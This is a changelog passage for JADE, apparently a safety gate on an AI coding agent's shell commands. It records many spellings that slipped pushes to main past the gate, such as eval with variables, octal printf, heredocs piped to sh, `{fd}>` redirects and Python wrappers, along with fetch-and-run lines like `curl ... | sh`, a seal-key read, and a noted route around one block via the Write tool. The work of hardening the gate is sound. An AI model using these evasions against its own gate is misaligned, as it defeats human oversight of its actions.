### Changed
- **A shorter README.** The front page now says what JADE is, where it runs, its status, the Quick start, the two settings, what leaves your machine, what a blocked command looks like, which documents to read, how to develop, and how to add policy overlays. Long detail moved to the documents, and nothing was deleted: the speed table to `docs/04` section 4d; the measured baseline and the facts about Jev through OpenRouter to `docs/00` (section 3 and section 1c); what the code holds, what 0.5 and 0.6 added, signed approval, hardening batch 1 and the full advisory-mode list to `docs/09` section 1; which release you are running (the trust root) to `docs/09` section 4; the facts of the author's machine to `docs/08`; the overlay keys and rules to `docs/08` section 2.8; the two ways to approve (30 and 10 minutes) to the README section on a blocked command; the layout, the classifier one-liner, baseline mining and the live probes to `CONTRIBUTING.md`. The README names no fact of one machine on one day (W-171) and now counts 13 architecture decisions. `tests/test_front_page.py` and `tests/test_docs_truth.py` check the same facts at their new place.
- **Clearer `jade` help.** Every command, subcommand and option of `jade`, `jade ask` and `jev` has a one-line help, each top-level command has a short description, and the common ones end with one example. The words are the same everywhere: gate mode, level, permit, ledger. Text only: no command, flag, default or exit code changed.
- **Memory keeps three more kinds of call as an exact answer only (W-137 for `launchctl`, and the calls the new shell reading now rates high). Safety change: it asks more, never less.** After one confirmed Allow, memory could run a later call of the same kind with no question. Now an answer for these covers only the same call: `launchctl bootout`, `unload` and `remove` (plain, or written to a script and run; owner decision for W-137), a call whose key still has a variable word (`b=feature; g=git; eval "$g push origin $b"`, `cat "git push origin HEAD:$b" | $h`: the key `git push origin $b` stands for every value of `$b`), and a call with a `$'..'` word (`git reset $'--hard\c x'`). These were low or medium on 0.7.0 and never asked. The levels, blocks and human-only checks did not change. `launchctl kickstart` and `load` and a plain `git reset --hard` stay a kind. Tests: `tests/acceptance/test_memory_a_shellnorm.py`.
- **Other API routes to the default branch, and variables with a known value, no longer run with no ask (W-191, also W-151). Safety change: it asks more.** These were known-gap rows rated low; they are now cases that must block (KG55, KG57 to KG67 moved to the adversarial set as A276 to A287). (1) API calls that write the default branch or merge, each by name, rated like a merge (R-10): a file written through the contents API with `branch=main`, with no branch (the API then uses the default branch) or with a branch the gate cannot read; a ref of the default branch made, moved or deleted through `git/refs`; the GraphQL mutations `createCommitOnBranch`, `updateRef` and `updateRefs`; `pulls/N/update-branch`; a whole `gh api` route held in a variable when the call changes something; and the merge route sent with `curl`, `wget` or `httpie` with a method that changes something (GitHub `pulls/N/merge` and GitLab `merge_requests/N/merge`; a merge like this is never remembered as a kind, only as an exact answer). A write to another branch and a read stay low: there is still no rule for every `gh api` call that changes something (the row asks for a replay first). (2) A variable set earlier in the same command is now read with its value inside `eval` and `sh -c` text (`g=git; eval "$g push origin main"`), in any word of a command (`v=push; git $v origin main`, `b=main; git push origin HEAD:$b`), and as the reader of a pipe (`h=sh; curl URL | $h`). These only add readings. A child shell does not see a variable that was not exported, so `sh -c '$g push origin main'` is asked about although it does not push: one question too many, never a push that is hidden. Values are read for every rule, not only for pushes: `F=~/.claude/settings.json; cp $F ...` is now rated as a write to that file. 13 real commands from past sessions rise because of this (under R-11, R-13, R-16, R-18, R-22 or R-32); the owner accepted this on 2026-11-20. A stage with more than 64 combinations of values, or past a work allowance counted in characters (16 000 for the whole command), is asked about (`cap:var-readings`, as before). origin/main's reading is still classified after the current one, also when all its parts are parts of the current reading: the gate carries what one part tells it to the next (a file fetched earlier, a `cd` to a computed folder, an exported `GIT_WORK_TREE`), so reading main's parts again finds what one pass misses (`g=echo; $g x; bash f; curl -o f URL` is fetch-then-run, high). A first version skipped it and rated such commands lower than origin/main; the review found it and the skip is gone (on 4 000 random commands made of shell fragments: 54 were weaker with the skip, 0 without it). Measured CPU time on long and pathological commands stays within 2.5 times that of 0.7.0, with two exceptions. (a) A stage read with many combinations of variable values costs one more reading for each combination (best of 9 runs): `a0=x; a0=y; ... git $a0 ... $a5 origin feature` (64 combinations) takes 0.029 s against 0.0017 s, about 17 times; 8 combinations take 0.004 s to 0.005 s, about 3 times. The worst found is several different 64-combination stages until the work allowance is spent: up to 0.25 s, against 0.005 s to 0.02 s (12 to 37 times). The orchestrator accepted this cost on 2026-11-21 as a reversible default. The knob is `_MAX_COMBINATIONS` in `jade/shellnorm.py` (now 64; a lower number reads fewer combinations and asks more often, `cap:var-readings`); `WORD_WORK` (16 000 characters) bounds the whole command. (b) A long heredoc piped to a shell on a later line (see the W-135 entry below: up to 52 times, accepted by the owner). A command that nests a variable command in itself (`g=git;$g $(g=git;$g $(...))`, 6 to 16 levels) takes at most 1.25 times 0.7.0; 420 deep nests of 6 to 12 levels with other payloads (`<(...)`, backticks, `git $v`, `curl URL | $h`) take 2.4 times 0.7.0 in total (25.8 s against 10.7 s). A first version of this change also read the variables inside a nested `$(...)`, backtick or `<(...)` text as words of the outer stage. That gave each level one more reading, read again at every depth, and cost up to 3.3 times 0.7.0 at 8 to 16 levels (6 times on the 420 deep nests). Now the nested text is read only by its own reading, with the same values. The ratings did not change: on 34 975 commands every level, invariant, human-only class and memory scope is the same as before this fix, and on the 420 deep nests every level and invariant. On 13 467 real and test commands none is rated lower than on origin/main; 53 real commands from past sessions are rated higher (about 40 of them are merges sent with curl).
- **More spellings that hid a push to main are read: the round 3 gaps, a heredoc piped to a shell on a later line, and `stdbuf` in front of a shell (W-135, found in the round 3 review of PR 47). Safety change: it blocks more.** Each fix adds a reading; none removes one, and the gate still reads every command the way origin/main read it as well. Part 1, the round 3 gaps that origin/main had as well: (1) A redirect in front of a program or in the middle of its words hid the script: `2>&1 bash -c 'git push origin main'`, `bash 2>&1 -c '...'`, `bash -c 2>&1 '...'`, `env 2>&1 bash -c`, `2>/dev/null eval '...'`, and in a pipe `echo '...' | 2>&1 sh`, `| >log sh`. The words without the redirect are read as well when they are a shell, `eval`, an interpreter, `ssh`, `su` or `script`. (2) A `#` right after a brace (`git push origin HEAD{#:main`, `echo a{#b; git push origin main`) is a character of a word in bash and zsh, but the scanner took it for a comment and dropped the rest of the line. (3) A brace inside a word cut the stage, so a `sh -c`, `eval`, heredoc, here-string, interpreter program or `curl | sh` after it was no longer read: `x={a sh -c 'git push origin main'`, `bash --rcfile {x} -c '...'`, `bash -s -- a{ <<EOF`, `bash -c 'echo '{'; git push origin :main'`, `curl https://x/{a}/i.sh | sh`. When such a stage ends, the whole stage (the brace being a letter of a word) is read as well, and the program that reads a heredoc, here-string or `<(` is found in it. (4) `${...}` closes at the first `}` that no quote, backslash, `$( )` or inner `${ }` holds (what bash does); the old count of braces ignored quotes and took the rest of the text for the expansion: `echo ${a:-\{x} ; git push origin main`, `echo ${a:-'}'} ; ...`, `echo "${y:-{}"; ...`. Checked against the real bash and zsh with a fuzz of 2 000 `${...}` fragments: the commands the gate missed went from 133 of 446 to 0 of 1 252 (one odd unclosed `$(` form was left in the first run). (5) `$((cmd); git push origin main)` is a command substitution that starts with a subshell in bash and zsh (the text has no `))` where the parentheses close); the gate read it as arithmetic and lost the last two characters. It is read as a command substitution as well, also where the parentheses inside do not balance. (6) A shift in `((1<<EOF))`, `$[1<<EOF]`, `a[1<<EOF]=x` or a C-style `for ((;;))` started no heredoc in the shell, but the gate swallowed the lines after it as a heredoc body, a push among them. (7) A newline after the pipe (`echo '...' |` then `sh` on the next line) cleared the producer; the blank and comment lines after a pipe are passed over now. A heredoc that is piped is closed in part 2. (8) The shell of a pipe after `exec -a x` or with a `+` option (`| exec -a x sh`, `| sh +e`), and a printer behind a launcher with options (`command -- echo`, `command -p printf`, `env -u HOME printf`, `env -C dir`, `nice --`, `nohup --`, `builtin --`) are read. (9) `printf 'git push origin %s;' feature :main | sh` writes its format again for the arguments that are left, `%.4s` cuts, zsh `print -f` does the same, and zsh `print -P` with `%(?.a.b)` writes either branch: each is read as one more text. Not closed in part 1, and left open in W-135: DF-7 was not reproduced: `{ git push } origin :feature; }` and its force and delete spellings are rated high by R-10 with `HO-delete`, and `:main` is blocked by SI-08, on origin/main and on this branch alike, so no code was changed for it (`{ git push } origin feature; }` has no human-only class, as with `git push origin feature`), E3-9 and B3-5/PF-1 (over-blocks and speed, not holes); part 2 closes a heredoc piped to a shell on a later line and `stdbuf` in front of a shell. Checked: a differential of origin/main (fe14b39) against this change on 3 406 commands (the test strings, a payload by wrapper matrix and the review commands), 4 000 random commands made of shell fragments around a payload and 98 ordinary commands with braces, redirects, `$(( ))`, `printf`, `${ }` and pipes: 0 commands got a lower level or lost a block, human-only class or SI-08 (374 and 52 of the first two are gated more), and the ordinary commands are rated as before; the time on 26 large and odd inputs (thousands of groups, braces, redirects, `$((`, `((`, `<<`, `${`, `env -u`, blank lines after a pipe) stayed within 2x of origin/main, except a heredoc after a brace word (`bash -s a{ <<EOF` with 4 000 lines): origin/main did not read the body, the gate reads it now in 0.7 s, less than the 1.3 s that the same heredoc after `bash -s a` costs on origin/main. Two slow cases were found and fixed on the way: a run of blanks after a pipe was checked again at every newline, and a `$((` that is never closed, which the shell takes for a syntax error, was also read as a command substitution at every level. Because the whole stage is read as well, an ordinary brace word (`find . -exec grep -l foo {} \;`) carries its `-exec` command in one more spelling: the size guard in `tests/test_redirect_round4.py` now allows the reading to be 7 times the line, not 5. Tests: `tests/test_redirect_w135.py` (real bash and zsh as the oracle). Part 2, the two holes that part 1 left open: (1) `cat <<EOF |`, the body, `EOF`, then `sh` on the next line: bash and zsh pipe the body to `sh`. The gate decided at `<<` which program reads the body, and the rest of that line was only `|`, so it found none. When a line ends in `|` and a heredoc is pending, the gate now looks for the reading stage after the heredoc bodies (past blank and comment lines, and through up to 16 more lines that end in `|`), hands it the bodies and the earlier stages of the pipeline, and starts the next stage after the bodies. Also for `<<'EOF'`, `<<-EOF`, two heredocs on one line, `tee <<EOF |` and `curl x <<EOF |`. A `sh` inside the body is text, not the reader. (2) `stdbuf -oL bash -c 'git push origin main'` was not read as `bash -c`: `stdbuf` (and `doas`, `setsid`, `ionice`, `taskset`, `chrt`, `unbuffer`, `busybox`) was only looked through at the end of a pipe. A stage that starts with one of them is now also read from the program it starts, with or without a redirect in its words, and so are `stdbuf -oL sh <<EOF`, `<<<` and `<(`. `stdbuf -o L` (the mode as its own word), the CPU mask of `taskset 1 sh` and the priority of `chrt 5 sh` are skipped. Checked with real bash and zsh: each new must-stop case pushes to the default branch in both (except `sudo sh` and the GNU-only `stdbuf --output=L`, kept as fail-closed). Time: origin/main did not read the body of a heredoc piped this way; the gate now reads each line of it as a command, which costs what the same body costs after `sh <<EOF` on origin/main. On a long body this is far past 3 times the time of origin/main (CPU time of one gate call, on a heavily loaded machine): 20 000 lines of `line $x` take 2.9 s against 0.17 s (17 times; other runs gave 14 to 30 times); 5 000 lines of `git push origin feature-N` take 1.6 to 2.0 s against 0.04 s (37 to 52 times, the worst case measured); 2 000 or 5 000 lines of `echo lineN $x` take 3.5 times as long. The same body after `sh <<EOF` takes 3.2 s and 1.8 s on origin/main too. Both grow in a straight line with the body, so no limit on the body size keeps the ratio under 3. The owner accepted this cost on 2026-11-20 as an exception to the rule that a change may cost at most 3 times the CPU time of origin/main: the body is read with no size limit and no extra question.
- **More spellings that hid a push to main are read: five from round 2, and a variable that may be empty (W-133, from the round 2 review of PR 47; they were open on origin/main too; the second part is an owner decision of 2026-11-20, narrow). Safety change: it blocks more.** Part 1, five spellings: (1) `printf 'git pu\163h origin main' | sh`, `print '...\155ain' | zsh`: `printf` and zsh `print` read a number with no leading 0 (`\163`), and zsh `echo` and `print` read `m` and `\U0000006d`; the gate decoded only `\0nnn` and `\xhh`. It now reads the text with each decoder. (2) The shell at the end of a pipe was missed with more options or inside a group: `... | sh -e -x`, `| (sh)`, `| { sh; }`, `| sh -c sh`. `-e` and `-r` are no code options for a shell (only `-c` is), and a `(` or `{ ` after the pipe is passed over to the first command in the group (`| (sh)`, `| { sh; }`); a shell that is not the first command of the group (`| (true; sh)`, `| (cat | sh)`) is still not read. (3) A file the command writes and then runs was missed through a launcher or a redirect: `echo '...' > f; env sh f`, `command sh f`, `exec bash f`, `nohup/nice/time sh f`, `sh < f`. (4) A heredoc delimiter quoted in part (`<<E"O"F`, `<<EO\F`) was read as the unquoted word `E`, so the body was read as if the shell joined a line that ends in a backslash. The whole delimiter word is read now, and any quote makes the body literal. (5) `$'... :main\c junk'`, also as a plain argument (`git push origin $'main\c@'`): bash ends the string at `\c` followed by a space, `@` or a backtick, and reads `\cj` as a newline; zsh reads `\c` as a plain `c`. The bash reading is now a reading of the whole command of its own, next to the current one. Not closed in part 1, and left open in W-133 (part 2 closes an unset variable in a push): the shell as a later command of a group, a push built by evaluation (`eval $x`, `$(echo git)`) and refspecs fed through `xargs` (the text is read, never evaluated). The old `then {` / `do {` word cut (SEG-3) was already closed. Checked with a differential of origin/main (fe14b39) against this change on 3 237 commands (the test and fixture strings plus the new spellings): 0 commands got a lower level or lost a block, and the gate stayed within 3x of the old time on large and odd inputs (the worst case, a 300 000 character `$'...\c y'` word, took 2.8 times as long because the bash reading is a second scan of the command). Tests: `tests/test_redirect_w133.py` (real bash and zsh as the oracle). Part 2, a variable that may be empty (F7 and part of F11): `git $x push origin :main` with `x` unset is `git push origin :main`, and `${X-git} push origin main` is `git push origin main`. The SI-08 hook now also reads a push with its unquoted variable words taken out (in front of the subcommand, and in the push itself: `git push $x origin` on main is a bare push of main), and `${NAME-word}` / `${NAME:-word}` / `${NAME=word}` as its word. This reading is used only to find a push to the default branch: it never lowers a rating, and a reading git cannot resolve proves nothing (the command as written is still resolved, and fails closed, as before). A quoted `"$x"` is an empty word, not no word, and stays. In a directory named by a variable (`cd "$d"`, `git -C "$d"`) only a push that names main or master counts. A variable glued to other text (`ma${x}in`) is not read. Still open (W-133): `eval $x`, `$(echo git) push`, `$GIT push` (the command is built at run time), and `echo main | xargs git push origin` (rated high, needs a permit, not blocked). Dry run before the change: of 15295 real git commands from past sessions, none is newly blocked; 20 test spellings are. Differential on 16669 real and test commands: none is rated or blocked lower than on origin/main or on the branch before this change.
- **A brace word after a redirect operator hid the rest of a push in zsh (W-131). Safety change: it blocks more.** In zsh `git > {a,b} push origin main` writes the files `a` and `b` and pushes to `main` (bash calls the target ambiguous and runs nothing). The gate expanded `{a,b}` into words first, took the first for the redirect and left `b` as a word of the command, so it read `git b push origin main` and the push was lost. The same for `>>`, `2>`, `&>`, `>|`, `>&`, `>!`, `<`, a glued target (`>{a,b}`, `a{b,c}`) and a push inside `sh -c`, `zsh -c`, `eval` or `echo '...' | zsh`. The gate now holds one more reading of such a command, in which every result of the brace word is a redirect (`git push origin main > a > b`), next to the two it had (origin/main's reading stays, so a result that is a word of a dangerous command, `rm >{x,-rf} dir`, is rated as before); the extra reading is made only when the command has a redirect operator followed by a brace word with a comma, so other commands cost the same. An empty result (`{a,}`) names no file. A brace word that is not a target (`git push origin {main,x}`, `echo > f {a,b}`) is expanded as before. The other spellings the row named (`git -C my\ repo push`, `a\ #c`, an odd word as a target, `git >! push origin HEAD:main`, `bash -c`, `eval`, `echo | sh` and heredoc wrappers that halve backslashes) were closed on the way to 0.7.0; `tests/test_redirect_w131.py` pins them and runs them in the real bash and zsh. Still open, and the row stays open for them (the same on 0.6.1): text that a command substitution makes and a shell then runs (`echo "$(echo '...')" | sh`, `sh <<EOF` with `$(cat <<X ...)` in it) is not read, with or without a backslash (the W-133 class); in zsh `eval` of a backtick `echo "..."` with 7 or 8 backslashes before an escaped operator is not read; a push built in a variable (`x=$(echo "..."); eval "$x"`) is not blocked by SI-08 (the text carries the `blind:eval-var` mark). Checked: about 12 800 spellings (wrappers with 1 to 9 backslashes, brace targets, `>!`, `a\ #c`, `-C my\ repo`) against the gate, and the 1 740 it did not stop in the real bash and zsh; a differential against origin/main (fe14b39) of 4 153 commands and of 2 420 more that put dangerous words in a brace target: none is rated lower, in level, blocked invariants, human-only classes or SI-08; 673 are rated higher, all of them commands with a brace target (389 of them zsh pushes that SI-08 now stops).
- **W-128 closed: a brace inside a word no longer hides a push to main (no code change).** The row said `git push origin feature a{ :main` was not stopped. It was fixed in 0.7.0 (the five readings of a brace, see the W-129/W-130/W-132 entry) and the row was never closed. ### Documentation
- **A known limit of SI-10 is written down and pinned by a test (W-122). No code change: the owner chose to keep SI-10 as it is.** SI-10 reads any glob as the permit seal key when the same command names JADE's state folder, so `cat ~/.local/share/jade/*.key` stays blocked. The same rule also blocks a heredoc whose body names the state folder and holds a glob such as `glob('*')` or `2 * 3`, when the body is read whole: a program body (`python3 - <<'EOF'`), a heredoc to a file on a line that also runs a test or a commit, a relative file after `cd`, or a file named by a variable. This body reads nothing, so the block is a false positive, and it is accepted. A heredoc that `cat` or `tee` writes to a plain file, with nothing else on the line, is not blocked. The way around it is the Write or Edit tool, whose text SI-10 does not read, and a separate command to run the test. `docs/05` (T19, after the W-71 text) says this. `tests/acceptance/test_si10_heredoc_limit_w122.py` pins the blocked spellings, the real read next to them, and the twins that pass (no state folder, a glob that cannot match the key name, no glob, a plain heredoc to a file, the Write and Edit tools). If SI-10 is changed later, this test fails and the change needs the owner's word.

### Fixed
- **A long run of digits before a redirect is checked for speed, shape by shape (W-125). Tests only: no code change.** W-125 said that 200 000 digits before a redirect (`echo 111...1>x`) took 84 s in one gate call. That was fixed in 0.7.0 by V6-08 (WT W-104), which starts a descriptor in `NULL_REDIRECT` only at the start of a run of digits. Measured now, one `policy.assess` call, CPU seconds, 200 000 digits: `>x` 1.95, `>&-` 1.02, `>&2` 0.04, `>/dev/null` 0.05, `2>&1` 0.05, `git push origin <digits>>x` 1.90 (origin/main gives the same numbers). But the timing case of V6-08 (`evals/performance/timing.jsonl`, P01) has no redirect after the digits, so a change that made one redirect shape slow again would pass it. `tests/test_digit_run_redirect_linear.py` puts 14 shapes after the digits (`>x`, `> x`, `>>x`, `<x`, `>|x`, `<>x`, `&>x`, `>&-`, `<<<x`, a heredoc, `>/dev/null`, `>&2`, a push target, after `;`): eight times the digits must take at most 24 times the CPU, and 32 000 digits must fit one second. A second test puts the old pattern back and sees the case fail. These tests time CPU, not the wall clock: on this loaded machine the wall clock of the same call varied 2 to 10 times between runs.
- **A named descriptor redirect (`{fd}>log`) and an output process substitution (`>(cmd)`) no longer hide a push to the default branch (W-120, SI-08 residuals).** Two holes, found by running every spelling in the real zsh and bash with a recording `git`: `git {fd}>log push origin feature :main` (zsh and bash 4.1+ take `{fd}>log` as a redirect and push to main) was rated low and not blocked, because the scanner read `{fd}` as a word that sat between `git` and `push`; `git push origin feature >(cat) :main` (also `2>(cat)`, `&>>(cat)`, `> >(cat)`, `&> >(cat)`, `{fd}>(cat)`) pushed to main and was not blocked, because the scanner read `(cat)` as a group that cut the push short in front of `:main`. Now `{name}` in front of a redirect operator at the start of a word is read as the redirect it is, and `>(cmd)` is one word (the path of a pipe) with `cmd` read as a command of its own, as `<(cmd)` already was. A command with one of these two spellings is also read as it was before this change (`_skeleton_both_top`, one more reading, only when the text has such a spelling), so a shell that does not know `{fd}>` (bash before 4.1) is read too, and no command is rated lower than before: over 19,758 commands (test fixtures, eval files, every spelling at every position of 13 base commands, 12,000 random strings) 0 are rated lower than on main and 776 higher. Speed (W-120 review): the first version of this change was not within three times main's CPU time on a long text made of one unit repeated (`git push origin x {fd}>l ` or `git push origin x >(cat) `, n times): the new reading makes it one long command, as the shell reads it, where main cut it at every brace or `(`, and one long command with a `git` in every unit costs the square of its length; 80 KB took 14.6 s against 1.3 s on main in the review, and 4.8 s against 0.65 s at 40 KB here, past the 6 s hook budget, so the hook blocked it (the figure of 2.2 times in the first version of this entry did not time this case). Now a text longer than 600 characters with one of these spellings has each run of one word, or of up to eight words, written four or five times in that reading (five when the run is odd in number, so a word that takes the next word as its value, `--upload-pack <program>`, reads the word after the run as the whole run does), as main already does in the readings of a long text with braces; the reading as it was before W-120 is not cut. One `policy.assess`, CPU seconds, three runs each, main then this branch: the `{fd}>l` unit 2.56-2.68 and 2.66-2.68 at 160 KB, 1.30-1.35 and 1.32-1.39 at 80 KB; the `>(cat)` unit 2.70-2.77 and 2.86-2.91 at 160 KB; a mixed unit (`{fd}>l >(cat) m{a,}in 2>&1`) 2.11-2.17 and 2.10-2.21 at 144 KB.   - **Second pass (verifier findings):** the first pass let some literal attacks through, now closed and tested (`tests/acceptance/test_gate_literal_forms.py`, eval cases A134 to A142 and R90 to R95).
    - **Newly blocked again:** a literal command cut into words, `subprocess.run(shlex.split("git push origin main"))`, `"...".split()`, `["git", *"push origin main".split()]`, `os.execvp("git", shlex.split(..))`; a program whose printed output a shell reads, `python3 -c 'print("...")' | sh`, the same with perl, node, ruby, php and awk, in a heredoc piped to a shell, under `eval "$(...)"`, `sh -c "$(...)"`, `bash <(...)` and `xargs -I{} sh -c {}` (every string such a program holds counts as a command; the same program piped to `cat`, `tee` or `grep` stays low); an awk program from stdin (`awk -f - <<EOF`, `-f /dev/stdin`); a command-running function passed as a value (`atexit.register(os.system, "...")`, `functools.partial`, `map`, `Thread(target=os.system, args=...)`, executors, `ctypes` `system()`, `eval(compile("..."))`); a literal command held in a dict, a class attribute, `self.x`, `os.environ`, a list item, or run from a comprehension or a `map(lambda ...)` over a literal list; a relative write after `os.chdir("jade")` or `cwd="jade"`. `xargs -I{} sh -c {}` is read as a shell reading stdin for echo and printf too (it was low).
